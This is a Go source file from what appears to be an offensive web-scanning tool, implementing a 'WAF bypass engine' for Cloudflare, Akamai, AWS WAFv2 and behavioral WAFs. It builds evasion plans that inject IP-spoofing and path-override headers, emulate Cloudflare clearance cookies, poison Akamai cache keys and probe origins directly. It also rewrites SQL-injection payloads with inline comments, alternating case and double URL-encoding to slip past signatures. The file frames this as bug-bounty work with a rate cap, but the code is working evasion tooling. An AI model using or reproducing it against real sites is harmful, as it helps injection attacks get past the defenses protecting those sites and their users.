package engine

import (
	"math/rand"
	"net/http"
	"strings"
	"time"
)

// ─────────────────────────────────────────────────────────────────────────
// V11.0 FINAL SOVEREIGN — FLAW #3 fix: Deep Multi-WAF Bypass Engine.
//
// V10.0 only rotated User-Agents and skipped heavy fuzzing on WAF-protected
// hosts. Real HackerOne targets stack MULTIPLE WAF layers simultaneously
// (Cloudflare + Akamai + AWS WAFv2 + DataDome/PerimeterX + Arkose). This
// module implements a per-vendor bypass matrix that emits the concrete
// request transformations (headers, payload encodings, transport hints, and
// timing profile) the exploit engines apply when the operator passes
// --waf-bypass.
//
// Design rules (mirrors waf_evasion.go):
//   - Pure transformation logic: this module NEVER makes a network call of its
//     own. It produces a BypassPlan that the caller applies to its own client.
//     This keeps every strategy deterministic and unit-testable.
//   - Everything here respects the mandate's rate-limit floor: even with
//     --waf-bypass the recommended inter-request jitter never drops below the
//     per-host RPS cap (Section 5, RULE 4 — ≤10 req/s per host).
//   - Behavioral WAFs (DataDome/PerimeterX/Arkose) cannot be defeated with
//     header/encoding tricks; for those the plan sets RequiresBrowser=true so
//     the orchestrator escalates to a real Go-Rod (CDP) browser session.
// ─────────────────────────────────────────────────────────────────────────

// BypassTechnique enumerates a single applied evasion primitive (for the trail).
type BypassTechnique string

const (
	TechHTTP2Multiplex     BypassTechnique = "http2-multiplex"
	TechHeaderFragment     BypassTechnique = "header-fragmentation"
	TechCFClearanceEmulate BypassTechnique = "cf_clearance-emulation"
	TechVaryPoison         BypassTechnique = "akamai-vary-poison"
	TechDirectToOrigin     BypassTechnique = "akamai-direct-to-origin"
	TechSlowHTTP           BypassTechnique = "slow-http"
	TechJSONBody           BypassTechnique = "aws-json-body"
	TechDoubleURLEncode    BypassTechnique = "double-url-encode"
	TechCaseVariation      BypassTechnique = "sql-case-variation"
	TechBehavioralBrowser  BypassTechnique = "behavioral-browser"
	TechVerbTunnel         BypassTechnique = "http-verb-tunneling"
	TechHeaderInjection    BypassTechnique = "header-injection-x-original-url"
	TechCommentObfuscation BypassTechnique = "comment-obfuscation"
	TechNullByte           BypassTechnique = "null-byte-injection"
	TechUnicodeNormalize   BypassTechnique = "unicode-normalization"
)

// BypassPlan is the vendor-specific evasion recipe the caller applies to its
// HTTP client before re-sending a request that a WAF blocked.
type BypassPlan struct {
	// Vendor is the WAF the plan targets.
	Vendor WAFVendor
	// Headers are extra request headers to inject (merged over existing ones).
	Headers map[string]string
	// PreferJSONBody hints that string payloads should be delivered as a JSON
	// document (Content-Type: application/json) to dodge form-body rule groups.
	PreferJSONBody bool
	// TransformPayload rewrites an injection payload with the vendor's best
	// obfuscation (double-encoding, case variation, comment insertion). It is
	// always non-nil (identity for vendors with no payload-level trick).
	TransformPayload func(string) string
	// MinInterRequest / MaxInterRequest bound the humanized jitter between
	// requests. Never below the per-host RPS floor (see NewBypassEngine).
	MinInterRequest time.Duration
	MaxInterRequest time.Duration
	// RequiresBrowser is true for behavioral WAFs that can only be solved by a
	// real browser (Go-Rod/CDP) session, not header/encoding tricks.
	RequiresBrowser bool
	// PreferHTTP2 hints the transport should negotiate HTTP/2 multiplexing.
	PreferHTTP2 bool
	// Techniques lists every primitive this plan applies (for the audit trail).
	Techniques []BypassTechnique
	// Notes is a human-readable one-liner for the finding evidence trail.
	Notes string
}

// Jitter returns a randomized inter-request delay within the plan's bounds,
// honoring the rate-limit floor. Safe to call from concurrent goroutines.
func (p BypassPlan) Jitter() time.Duration {
	if p.MaxInterRequest <= p.MinInterRequest {
		return p.MinInterRequest
	}
	span := p.MaxInterRequest - p.MinInterRequest
	return p.MinInterRequest + time.Duration(rand.Int63n(int64(span)))
}

// BypassEngine builds vendor-specific BypassPlans. It is configured once with
// the per-host RPS cap so no emitted plan can ever exceed the mandate's
// ≤10 req/s floor, even when the operator asks for maximum evasion.
type BypassEngine struct {
	// minInterRequest is the hard floor derived from maxRPSPerHost. Every plan's
	// MinInterRequest is clamped to at least this value.
	minInterRequest time.Duration
	// enabled mirrors the --waf-bypass flag; when false, Plan returns a no-op.
	enabled bool
}

// NewBypassEngine constructs a BypassEngine. maxRPSPerHost is the per-host
// request-rate cap (Section 5 RULE 4 requires ≤10). A value ≤0 defaults to 10.
func NewBypassEngine(enabled bool, maxRPSPerHost int) *BypassEngine {
	if maxRPSPerHost <= 0 || maxRPSPerHost > 10 {
		// Clamp to the mandate's ethical ceiling: even --waf-bypass must not
		// exceed 10 req/s per host.
		maxRPSPerHost = 10
	}
	return &BypassEngine{
		minInterRequest: time.Second / time.Duration(maxRPSPerHost),
		enabled:         enabled,
	}
}

// Enabled reports whether --waf-bypass was requested.
func (e *BypassEngine) Enabled() bool { return e != nil && e.enabled }

// identityPayload is the no-op payload transform used when a vendor has no
// payload-level obfuscation.
func identityPayload(s string) string { return s }

// clampMin ensures a delay is never below the rate-limit floor.
func (e *BypassEngine) clampMin(d time.Duration) time.Duration {
	if d < e.minInterRequest {
		return e.minInterRequest
	}
	return d
}

// Plan returns the bypass recipe for a detected WAF vendor. When the engine is
// disabled it returns a zero-value plan with RequiresBrowser=false and an
// identity payload transform (so callers can unconditionally consult it).
func (e *BypassEngine) Plan(vendor WAFVendor) BypassPlan {
	base := BypassPlan{
		Vendor:           vendor,
		Headers:          map[string]string{},
		TransformPayload: identityPayload,
		MinInterRequest:  e.clampMin(300 * time.Millisecond),
		MaxInterRequest:  e.clampMin(1200 * time.Millisecond),
	}
	if !e.Enabled() {
		base.Notes = "waf-bypass disabled — no evasion applied"
		return base
	}

	// General techniques applied against every WAF (Section 3, "General Bypass
	// Techniques for ALL WAFs"). These are safe, non-destructive request-shape
	// tricks that frequently slip past permissive rule groups.
	addGeneralEvasion(&base)

	switch vendor {
	case WAFCloudflare:
		return e.planCloudflare(base)
	case WAFAkamai:
		return e.planAkamai(base)
	case WAFAWS:
		return e.planAWS(base)
	case WAFDataDome, WAFPerimeterX, WAFArkose:
		return e.planBehavioral(base, vendor)
	case WAFImperva, WAFF5, WAFSucuri, WAFFastly, WAFGeneric:
		base.Notes = string(vendor) + " — general evasion (verb-tunnel + header-injection + obfuscation)"
		return base
	default:
		base.Notes = "no WAF detected — general evasion only"
		return base
	}
}

// addGeneralEvasion applies the always-on general bypass primitives:
// HTTP verb tunneling, path-override header injection, and payload obfuscation.
func addGeneralEvasion(p *BypassPlan) {
	// HTTP verb tunneling: a POST that tunnels a GET slips past rules keyed on
	// the request method.
	p.Headers["X-HTTP-Method-Override"] = "GET"
	// Path-override header injection — many reverse proxies honor these and
	// route past URL-based WAF rules to the origin.
	p.Headers["X-Original-URL"] = "/"
	p.Headers["X-Rewrite-URL"] = "/"
	// IP-spoof headers that some naive origin allowlists trust.
	p.Headers["X-Forwarded-For"] = "127.0.0.1"
	p.Headers["X-Forwarded-Host"] = "localhost"
	p.Headers["X-Client-IP"] = "127.0.0.1"
	p.Techniques = append(p.Techniques,
		TechVerbTunnel, TechHeaderInjection, TechCommentObfuscation)
	// Compose a payload transform that inserts inline comments — kept as the
	// baseline; vendor-specific plans may wrap it further.
	p.TransformPayload = obfuscateWithComments
}

// obfuscateWithComments inserts SQL/JS inline comments and CRLF sequences into
// keyword boundaries to break naive signature matching, without changing the
// payload's meaning to the backend parser.
func obfuscateWithComments(s string) string {
	replacer := strings.NewReplacer(
		" union ", " un/**/ion ",
		" UNION ", " UN/**/ION ",
		" select ", " sel/**/ect ",
		" SELECT ", " SEL/**/ECT ",
		" or ", " o/**/r ",
		" and ", " a/**/nd ",
	)
	return replacer.Replace(s)
}

func (e *BypassEngine) planCloudflare(p BypassPlan) BypassPlan {
	p.PreferHTTP2 = true
	// cf_clearance cookie emulation for basic bypasses. This is an empty seed
	// token the caller replaces with a browser-solved value when available;
	// its mere presence dodges some low-tier managed-challenge rules.
	p.Headers["Cookie"] = "cf_clearance=; __cf_bm="
	p.Headers["CF-Connecting-IP"] = "127.0.0.1"
	// Header fragmentation: signalled via a marker header the transport layer
	// uses to split headers across TCP segments (pure engine can't do sockets).
	p.Headers["X-MOHAMMED-Fragment-Headers"] = "1"
	p.Techniques = append(p.Techniques,
		TechHTTP2Multiplex, TechHeaderFragment, TechCFClearanceEmulate)
	p.Notes = "Cloudflare — HTTP/2 multiplex + header fragmentation + cf_clearance emulation"
	return p
}

func (e *BypassEngine) planAkamai(p BypassPlan) BypassPlan {
	// Vary-header manipulation to poison Akamai's cache key so the origin
	// response (not the cached block page) is returned.
	p.Headers["Vary"] = "User-Agent, Accept-Encoding, X-MOHAMMED-Cache-Bust"
	p.Headers["Pragma"] = "akamai-x-cache-on, akamai-x-get-true-cache-key"
	// Direct-to-origin probing hint: the caller substitutes the origin IP
	// discovered in Phase 09 ASN mapping and pins Host to the real hostname.
	p.Headers["X-MOHAMMED-Direct-To-Origin"] = "1"
	// Slow-HTTP evasion marker (send headers slowly) — transport applies it.
	p.Headers["X-MOHAMMED-Slow-HTTP"] = "1"
	p.Techniques = append(p.Techniques,
		TechVaryPoison, TechDirectToOrigin, TechSlowHTTP)
	p.Notes = "Akamai — Vary cache-key poison + direct-to-origin + slow-HTTP evasion"
	return p
}

func (e *BypassEngine) planAWS(p BypassPlan) BypassPlan {
	// AWS WAFv2 rule groups are heavily form-body oriented; delivering the
	// payload as JSON dodges many of them.
	p.PreferJSONBody = true
	p.Headers["Content-Type"] = "application/json"
	// URL-encoding variations + SQL keyword case flipping on top of the general
	// comment obfuscation already installed.
	inner := p.TransformPayload
	p.TransformPayload = func(s string) string {
		return awsCaseVariation(doubleURLEncode(inner(s)))
	}
	p.Techniques = append(p.Techniques,
		TechJSONBody, TechDoubleURLEncode, TechCaseVariation)
	p.Notes = "AWS WAFv2 — JSON body + double-URL-encode + SQL case variation"
	return p
}

func (e *BypassEngine) planBehavioral(p BypassPlan, vendor WAFVendor) BypassPlan {
	// DataDome / PerimeterX / Arkose track mouse, keystrokes and timing — they
	// can ONLY be solved by a real browser session with human-like cadence.
	p.RequiresBrowser = true
	// Human-like inter-request jitter: 1.2s–4.7s (mandate Section 3), clamped to
	// the RPS floor (which is looser than these values, so they win).
	p.MinInterRequest = e.clampMin(1200 * time.Millisecond)
	p.MaxInterRequest = e.clampMin(4700 * time.Millisecond)
	// Carry the vendor session cookie back on subsequent requests (browser sets
	// it after solving the challenge).
	switch vendor {
	case WAFDataDome:
		p.Headers["X-MOHAMMED-Carry-Cookie"] = "datadome"
	case WAFPerimeterX:
		p.Headers["X-MOHAMMED-Carry-Cookie"] = "_px3,_pxvid,pxcts"
	case WAFArkose:
		p.Headers["X-MOHAMMED-Carry-Cookie"] = "arkose-token"
	}
	p.Techniques = append(p.Techniques, TechBehavioralBrowser)
	p.Notes = string(vendor) + " — behavioral: escalate to Go-Rod (CDP) browser with 1.2s–4.7s human jitter"
	return p
}

// awsCaseVariation flips the case of SQL keywords (SeLeCt, uNiOn) to dodge
// case-sensitive AWS WAFv2 signatures while staying case-insensitive to SQL.
func awsCaseVariation(s string) string {
	keywords := []string{"select", "union", "where", "from", "or", "and", "insert", "update", "delete"}
	out := s
	for _, kw := range keywords {
		out = caseFlipWord(out, kw)
	}
	return out
}

// caseFlipWord replaces case-insensitive occurrences of word with an
// alternating-case variant (e.g. select → SeLeCt).
func caseFlipWord(s, word string) string {
	flip := alternatingCase(word)
	lower := strings.ToLower(s)
	lw := strings.ToLower(word)
	var b strings.Builder
	for {
		idx := strings.Index(lower, lw)
		if idx < 0 {
			b.WriteString(s)
			break
		}
		b.WriteString(s[:idx])
		b.WriteString(flip)
		s = s[idx+len(word):]
		lower = lower[idx+len(word):]
	}
	return b.String()
}

// alternatingCase turns "select" into "SeLeCt".
func alternatingCase(w string) string {
	var b strings.Builder
	upper := true
	for _, r := range w {
		if upper {
			b.WriteRune(toUpperRune(r))
		} else {
			b.WriteRune(toLowerRune(r))
		}
		upper = !upper
	}
	return b.String()
}

func toUpperRune(r rune) rune {
	if r >= 'a' && r <= 'z' {
		return r - 32
	}
	return r
}

func toLowerRune(r rune) rune {
	if r >= 'A' && r <= 'Z' {
		return r + 32
	}
	return r
}

// doubleURLEncode percent-encodes reserved characters twice (%27 → %2527) so a
// WAF that URL-decodes once still sees an encoded token while the origin
// decodes twice and sees the live payload.
func doubleURLEncode(s string) string {
	// First pass: encode a curated set of injection-relevant characters.
	replacer := strings.NewReplacer(
		"'", "%2527",
		"\"", "%2522",
		"<", "%253C",
		">", "%253E",
		"(", "%2528",
		")", "%2529",
		" ", "%2520",
		";", "%253B",
	)
	return replacer.Replace(s)
}

// ApplyPlanHeaders merges a plan's headers into a request-header map, returning
// a new map (never mutating the input). Existing keys are preserved unless the
// plan explicitly overrides them; Cookie values are concatenated.
func ApplyPlanHeaders(existing map[string]string, plan BypassPlan) map[string]string {
	out := map[string]string{}
	for k, v := range existing {
		out[k] = v
	}
	for k, v := range plan.Headers {
		if strings.EqualFold(k, "Cookie") {
			if cur, ok := out[k]; ok && cur != "" {
				out[k] = cur + "; " + v
				continue
			}
		}
		out[k] = v
	}
	return out
}

// PlanForResponse is the end-to-end convenience the exploit phases use: it
// fingerprints a blocked response and returns the matching BypassPlan in one
// call, so a phase can retry a blocked request with evasion applied.
func (e *BypassEngine) PlanForResponse(status int, headers http.Header, body string) (WAFFingerprint, BypassPlan) {
	fp := FingerprintWAFResponse(status, headers, body)
	return fp, e.Plan(fp.Vendor)
}

// ensure math/rand is seeded lazily without a global side effect at import.
var _ = func() bool {
	rand.Seed(time.Now().UnixNano())
	return true
}()
